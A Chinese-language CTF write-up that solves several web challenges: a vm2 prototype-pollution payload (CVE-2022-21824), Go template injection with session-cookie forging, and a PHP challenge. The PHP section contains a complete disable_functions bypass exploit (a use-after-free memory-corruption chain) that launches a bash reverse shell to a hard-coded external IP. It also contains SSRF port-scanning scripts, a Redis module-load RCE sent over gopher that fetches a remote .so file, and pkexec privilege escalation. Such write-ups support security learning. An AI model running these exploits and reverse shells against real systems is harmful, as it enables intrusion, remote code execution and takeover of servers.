@[toc]

##  GameV4.0

![image-20220212102026276](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/1930f17ce45a6b6052fe5d5a3ea6c4e5.png)

直接base64解码

## newcalc0

源码

```js
const express = require("express");
const path = require("path");
const vm2 = require("vm2");

const app = express();
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

app.use(express.static("static"));

const vm = new vm2.NodeVM();

app.use("/eval", (req, res) => {
  const e = req.body.e;
  if (!e) {
    res.send("wrong?");
    return;
  }
  try {
    res.send(vm.run("module.exports="+e)?.toString() ?? "no");
  } catch (e) {
    console.log(e)
    res.send("wrong?");
  }
});

app.use("/flag", (req, res) => {
  if(Object.keys(Object.prototype).length > 0) {
    Object.keys(Object.prototype).forEach(k => delete Object.prototype[k]);
    res.send(process.env.FLAG);
  } else {
    res.send(Object.keys(Object.prototype));
  }
})

app.use("/source", (req, res) => {
  let p = req.query.path || "/src/index.js";
  p = path.join(path.resolve("."), path.resolve(p));
  console.log(p);
  res.sendFile(p);
});

app.use((err, req, res, next) => {
  console.log(err)
  res.redirect("index.html");
});

app.listen(process.env.PORT || 8888);

```

审计代码：

满足下面代码，就可以直接得到flag

```
if(Object.keys(Object.prototype).length > 0)
```

一般来说`object.prototype`都是null，length都为0

这个利用`CVE-2022-21824`

直接上payload

```
console.table([{a:1}],['__proto__'])
```

payload，就通过`console.log`使得Object.prototype[0]变成空字符，长度不为0

然后访问/flag，就可以得到flag。

## gocalc0

###  非预期

就是抓包得cookie，然后base64解码（但是我复现的时候没成功）

###  预期

SSTI拿到源码

```
{{.}}
```

源码

```go
package main
import (
	_ "embed"
	"fmt"
	"os"
	"reflect"
	"strings"
	"text/template"

	"github.com/gin-contrib/sessions"
	"github.com/gin-contrib/sessions/cookie"
	"github.com/gin-gonic/gin"
	"github.com/maja42/goval"
)

//go:embed template/index.html
var tpl string

//go:embed main.go
var source string

type Eval struct {
	E string `json:"e" form:"e" binding:"required"`
}

func (e Eval) Result() (string, error) {
	eval := goval.NewEvaluator()
	result, err := eval.Evaluate(e.E, nil, nil)
	if err != nil {
		return "", err
	}
	t := reflect.ValueOf(result).Type().Kind()

	if t == reflect.Int {
		return fmt.Sprintf("%d", result.(int)), nil
	} else if t == reflect.String {
		return result.(string), nil
	} else {
		return "", fmt.Errorf("not valid type")
	}
}

func (e Eval) String() string {
	res, err := e.Result()
	if err != nil {
		fmt.Println(err)
		res = "invalid"
	}
	return fmt.Sprintf("%s = %s", e.E, res)
}

func render(c *gin.Context) {
	session := sessions.Default(c)

	var his string

	if session.Get("history") == nil {
		his = ""
	} else {
		his = session.Get("history").(string)
	}

	fmt.Println(strings.ReplaceAll(tpl, "{{result}}", his))
	t, err := template.New("index").Parse(strings.ReplaceAll(tpl, "{{result}}", his))
	if err != nil {
		fmt.Println(err)
		c.String(500, "internal error")
		return
	}
	if err := t.Execute(c.Writer, map[string]string{
		"s0uR3e": source,
	}); err != nil {
		fmt.Println(err)
	}
}

func main() {
	port := os.Getenv("PORT")
	if port == "" {
		port = "8080"
	}

	r := gin.Default()
	store := cookie.NewStore([]byte("woW_you-g0t_sourcE_co6e"))
	r.Use(sessions.Sessions("session", store))

	r.GET("/", func(c *gin.Context) {
		render(c)
	})

	r.GET("/flag", func(c *gin.Context) {
		session := sessions.Default(c)
		session.Set("FLAG", os.Getenv("FLAG"))
		session.Save()
		c.String(200, "flag is in your session")
	})

	r.POST("/", func(c *gin.Context) {
		session := sessions.Default(c)

		var his string

		if session.Get("history") == nil {
			his = ""
		} else {
			his = session.Get("history").(string)
		}

		eval := Eval{}
		if err := c.ShouldBind(&eval); err == nil {
			his = his + eval.String() + "

```

exp

```
package main

import (
	_ "embed"
	"fmt"
	"os"

	"github.com/gin-contrib/sessions"
	"github.com/gin-contrib/sessions/cookie"
	"github.com/gin-gonic/gin"
)

func main() {
	port := os.Getenv("PORT")
	if port == "" {
		port = "8088"
	}
	r := gin.Default()
	store := cookie.NewStore([]byte("woW_you-g0t_sourcE_co6e"))
	r.Use(sessions.Sessions("session", store))
	r.GET("/flag", func(c *gin.Context) {
		session := sessions.Default(c)
		c.String(200, session.Get("FLAG").(string))
	})
	r.Run(fmt.Sprintf(":%s", port))
}
```

##  InterestingPHP



打开网页

![image-20220222211753420](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202202222118509.png)

这个跟WMCTF的那个题比较相似。

利用`eval`发现`phpinfo()`被禁用了。

所以我们可以利用**这个姿势**（长知识了）

```
var_dump(get_cfg_var("disable_functions"));
var_dump(get_cfg_var("open_basedir"));
var_dump(ini_get_all());
```

可以发现存在`disabled_function`

![image-20220222212159055](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202202222121101.png)



### 解法1：

直接尝试bybass

[网上找的大佬的exp](https://github.com/mm0r1/exploits/blob/master/php-filter-bypass/exploit.php)

`fwrite` 被禁了，改成 `fputs`

然后构造数据包，抓包，只需要在包后面加上

```
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryj28zfvoWVxnHdp29
Content-Length: 6927

------WebKitFormBoundaryj28zfvoWVxnHdp29
Content-Disposition: form-data; name="1"

pwn("bash -c 'exec bash -i &>/dev/tcp/42.193.170.176/10000 <&1'");

function pwn($cmd) {
    define('LOGGING', false);
    define('CHUNK_DATA_SIZE', 0x60);
    define('CHUNK_SIZE', ZEND_DEBUG_BUILD ? CHUNK_DATA_SIZE + 0x20 : CHUNK_DATA_SIZE);
    define('FILTER_SIZE', ZEND_DEBUG_BUILD ? 0x70 : 0x50);
    define('STRING_SIZE', CHUNK_DATA_SIZE - 0x18 - 1);
    define('CMD', $cmd);
    for($i = 0; $i < 10; $i++) {
        $groom[] = Pwn::alloc(STRING_SIZE);
    }
    stream_filter_register('pwn_filter', 'Pwn');
    $fd = fopen('php://memory', 'w');
    stream_filter_append($fd,'pwn_filter');
    fputs($fd, 'x');
}

class Helper { public $a, $b, $c; }
class Pwn extends php_user_filter {
    private $abc, $abc_addr;
    private $helper, $helper_addr, $helper_off;
    private $uafp, $hfp;

    public function filter($in, $out, &$consumed, $closing) {
        if($closing) return;
        stream_bucket_make_writeable($in);
        $this->filtername = Pwn::alloc(STRING_SIZE);
        fclose($this->stream);
        $this->go();
        return PSFS_PASS_ON;
    }

    private function go() {
        $this->abc = &$this->filtername;

        $this->make_uaf_obj();

        $this->helper = new Helper;
        $this->helper->b = function($x) {};

        $this->helper_addr = $this->str2ptr(CHUNK_SIZE * 2 - 0x18) - CHUNK_SIZE * 2;
        $this->log("helper @ 0x%x", $this->helper_addr);

        $this->abc_addr = $this->helper_addr - CHUNK_SIZE;
        $this->log("abc @ 0x%x", $this->abc_addr);

        $this->helper_off = $this->helper_addr - $this->abc_addr - 0x18;

        $helper_handlers = $this->str2ptr(CHUNK_SIZE);
        $this->log("helper handlers @ 0x%x", $helper_handlers);

        $this->prepare_leaker();

        $binary_leak = $this->read($helper_handlers + 8);
        $this->log("binary leak @ 0x%x", $binary_leak);
        $this->prepare_cleanup($binary_leak);

        $closure_addr = $this->str2ptr($this->helper_off + 0x38);
        $this->log("real closure @ 0x%x", $closure_addr);

        $closure_ce = $this->read($closure_addr + 0x10);
        $this->log("closure class_entry @ 0x%x", $closure_ce);

        $basic_funcs = $this->get_basic_funcs($closure_ce);
        $this->log("basic_functions @ 0x%x", $basic_funcs);

        $zif_system = $this->get_system($basic_funcs);
        $this->log("zif_system @ 0x%x", $zif_system);

        $fake_closure_off = $this->helper_off + CHUNK_SIZE * 2;
        for($i = 0; $i < 0x138; $i += 8) {
            $this->write($fake_closure_off + $i, $this->read($closure_addr + $i));
        }
        $this->write($fake_closure_off + 0x38, 1, 4);

        $handler_offset = PHP_MAJOR_VERSION === 8 ? 0x70 : 0x68;
        $this->write($fake_closure_off + $handler_offset, $zif_system);

        $fake_closure_addr = $this->helper_addr + $fake_closure_off - $this->helper_off;
        $this->write($this->helper_off + 0x38, $fake_closure_addr);
        $this->log("fake closure @ 0x%x", $fake_closure_addr);

        $this->cleanup();
        ($this->helper->b)(CMD);
    }

    private function make_uaf_obj() {
        $this->uafp = fopen('php://memory', 'w');
        fputs($this->uafp, pack('QQQ', 1, 0, 0xDEADBAADC0DE));
        for($i = 0; $i < STRING_SIZE; $i++) {
            fputs($this->uafp, "\x00");
        }
    }

    private function prepare_leaker() {
        $str_off = $this->helper_off + CHUNK_SIZE + 8;
        $this->write($str_off, 2);
        $this->write($str_off + 0x10, 6);

        $val_off = $this->helper_off + 0x48;
        $this->write($val_off, $this->helper_addr + CHUNK_SIZE + 8);
        $this->write($val_off + 8, 0xA);
    }

    private function prepare_cleanup($binary_leak) {
        $ret_gadget = $binary_leak;
        do {
            --$ret_gadget;
        } while($this->read($ret_gadget, 1) !== 0xC3);
        $this->log("ret gadget = 0x%x", $ret_gadget);
        $this->write(0, $this->abc_addr + 0x20 - (PHP_MAJOR_VERSION === 8 ? 0x50 : 0x60));
        $this->write(8, $ret_gadget);
    }

    private function read($addr, $n = 8) {
        $this->write($this->helper_off + CHUNK_SIZE + 16, $addr - 0x10);
        $value = strlen($this->helper->c);
        if($n !== 8) { $value &= (1 << ($n << 3)) - 1; }
        return $value;
    }

    private function write($p, $v, $n = 8) {
        for($i = 0; $i < $n; $i++) {
            $this->abc[$p + $i] = chr($v & 0xff);
            $v >>= 8;
        }
    }

    private function get_basic_funcs($addr) {
        while(true) {
            // In rare instances the standard module might lie after the addr we're starting
            // the search from. This will result in a SIGSGV when the search reaches an unmapped page.
            // In that case, changing the direction of the search should fix the crash.
            // $addr += 0x10;
            $addr -= 0x10;
            if($this->read($addr, 4) === 0xA8 &&
                in_array($this->read($addr + 4, 4),
                    [20151012, 20160303, 20170718, 20180731, 20190902, 20200930])) {
                $module_name_addr = $this->read($addr + 0x20);
                $module_name = $this->read($module_name_addr);
                if($module_name === 0x647261646e617473) {
                    $this->log("standard module @ 0x%x", $addr);
                    return $this->read($addr + 0x28);
                }
            }
        }
    }

    private function get_system($basic_funcs) {
        $addr = $basic_funcs;
        do {
            $f_entry = $this->read($addr);
            $f_name = $this->read($f_entry, 6);
            if($f_name === 0x6d6574737973) {
                return $this->read($addr + 8);
            }
            $addr += 0x20;
        } while($f_entry !== 0);
    }

    private function cleanup() {
        $this->hfp = fopen('php://memory', 'w');
        fputs($this->hfp, pack('QQ', 0, $this->abc_addr));
        for($i = 0; $i < FILTER_SIZE - 0x10; $i++) {
            fputs($this->hfp, "\x00");
        }
    }

    private function str2ptr($p = 0, $n = 8) {
        $address = 0;
        for($j = $n - 1; $j >= 0; $j--) {
            $address <<= 8;
            $address |= ord($this->abc[$p + $j]);
        }
        return $address;
    }

    private function ptr2str($ptr, $n = 8) {
        $out = '';
        for ($i = 0; $i < $n; $i++) {
            $out .= chr($ptr & 0xff);
            $ptr >>= 8;
        }
        return $out;
    }

    private function log($format, $val = '') {
        if(LOGGING) {
            printf("{$format}\n", $val);
        }
    }

    static function alloc($size) {
        return str_shuffle(str_repeat('A', $size));
    }
}
?>
```

![image-20220222212531056](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202202222125112.png)

发现有回显，直接[反弹shell](https://xz.aliyun.com/t/9488#toc-0)

```
bash -c 'exec bash -i &>/dev/tcp/VPN_IP/PORT <&1'
```

注意：`pwn`中一个要改成双引号

![image-20220222212825072](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202202222128105.png)

![image-20220222212900178](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202202222129207.png)

需要提权

```
find / -perm -u=s -type f 2>/dev/null
```

![image-20220214141958345](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202202222129076.png)

发现可以1利用[`pkexec`提权](https://github.com/arthepsy/CVE-2021-4034)

![image-20220222213057163](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202202222130198.png)

即可得到flag

###  解法2

知道了`disabled_function`,我们利用`exp=print_r(scandir(./));`可以获取目录

下载下来发现是一个redis的数据备份文件，猜测密码为`ye_w4nt_a_gir1fri3nd`

密码知道了，方式是SSRF打redis，但是还差个端口（测试端口不是6359）

直接利用`dict`探测端口，但是发现利用`burp`的方式不行，因为所有的返回都一样。

我们可以利用`python`(涨知识了)

```python
import requests
from urllib import parse

url = "http://e029afc9-43c2-4a3d-9922-1d703aab43fd.node4.buuoj.cn:81/?exp=eval($_POST[0]);"
headers = {"content-type":"application/x-www-form-urlencoded"}

payload = '''
      function Curl($url) {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt ( $ch, CURLOPT_RETURNTRANSFER, true );
            $result = curl_exec($ch);
            curl_close($ch);
            if($result!=''){
            echo $result.$url;
            }
            
        } 
        for($i=0;$i<9999;$i++){
            Curl("dict://127.0.0.1:$i/info");
            }
        '''

data = {
    0:payload
}

r = requests.post(url,data=data,headers=headers).text
print(r)

```

扫到8888端口

还有一种扫端口的方式

```php
<?php
highlight_file(__FILE__);
# Port scan
for($i=0;$i<65535;$i++) {
  $t=stream_socket_server("tcp://0.0.0.0:".$i,$ee,$ee2);
  if($ee2 === "Address already in use") {
    var_dump($i);
  }
}

```

```php
for($i=0;$i<65535;$i++) {
  $t=file_get_contents('http://127.0.0.1:'.$i);
  if(!strpos(error_get_last()['message'], "Connection refused")) {
    var_dump($i);
  }
}

```

直接传入

```
/?exp=eval(file_put_contents("a.php",base64_decode($_POST['a'])));
POST:
a=PD9waHAKaGlnaGxpZ2h0X2ZpbGUoX19GSUxFX18pOwojIFBvcnQgc2Nhbgpmb3IoJGk9MDskaTw2NTUzNTskaSsrKSB7CiAgJHQ9c3RyZWFtX3NvY2tldF9zZXJ2ZXIoInRjcDovLzAuMC4wLjA6Ii4kaSwkZWUsJGVlMik7CiAgaWYoJGVlMiA9PT0gIkFkZHJlc3MgYWxyZWFkeSBpbiB1c2UiKSB7CiAgICB2YXJfZHVtcCgkaSk7CiAgfQp9Cg==（为第一个代码的base64加密）
```

![image-20220222215541833](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202202222155874.png)也可以得到8888端口

然后想，怎么打redis？

想到redis主从复制RCE，先利用`file_put_contents`写so文件

由于`file_get_contents`被ban，使用`curl`访问外网来加载so文件

```python
import requests

url = "http://8ec6d21f-173b-438e-a82c-e63de72956ab.node4.buuoj.cn:81/?exp=eval($_POST[0]);"
headers = {"content-type": "application/x-www-form-urlencoded"}
pay = "http://ip/exp.so"
payload = '''
      function Curl($url) {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt ( $ch, CURLOPT_RETURNTRANSFER, true );
            $result = curl_exec($ch);
            curl_close($ch);
            file_put_contents("exp.so",$result);
      }

      Curl("''' + pay + '''");
'''.strip()

data = {
    0: payload
}
r = requests.post(url, data, headers=headers).text
print(r)

```

然后发弹shell

```python
import requests
from urllib import parse


url = "http://e029afc9-43c2-4a3d-9922-1d703aab43fd.node4.buuoj.cn:81/?exp=eval($_POST[0]);"
headers = {"content-type":"application/x-www-form-urlencoded"}

pay="""auth ye_w4nt_a_gir1fri3nd
module load ./ex.so
system.exec 'bash -c "bash -i >& /dev/tcp/ip/7777 0>&1"'
quit
""".replace('\n','\r\n')

payload = '''
      function Curl($url) {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt ( $ch, CURLOPT_RETURNTRANSFER, true );
            $result = curl_exec($ch);
            curl_close($ch);
            if($result!=''){
            echo $result;
            }
            
        } 
        Curl("gopher://127.0.0.1:8888/_'''+parse.quote(pay)+'''");
        '''

data = {
    0:payload
}

r = requests.post(url,data=data,headers=headers).text
print(r)
```

也可以这么写

```python
import base64
import requests

url = "http://8ec6d21f-173b-438e-a82c-e63de72956ab.node4.buuoj.cn:81/?exp=eval(base64_decode($_POST[0]));"
payload = '''
        $redis = new Redis();
        $redis->connect('127.0.0.1',8888);
        $redis->auth('ye_w4nt_a_gir1fri3nd');
        $redis->rawCommand('module','load','/var/www/html/exp.so');
        $redis->rawCommand("system.exec","bash -c 'exec bash -i &>/dev/tcp/ip/39543 <&1'");
'''
payload=base64.b64encode(payload.encode(encoding="utf-8"))
data = {
    0: payload
}
r = requests.post(url, data=data).text
print(r)

```

后面提权就是一样的了。

参考文章：

https://blog.csdn.net/cosmoslin/article/details/122930836?spm=1001.2014.3001.5502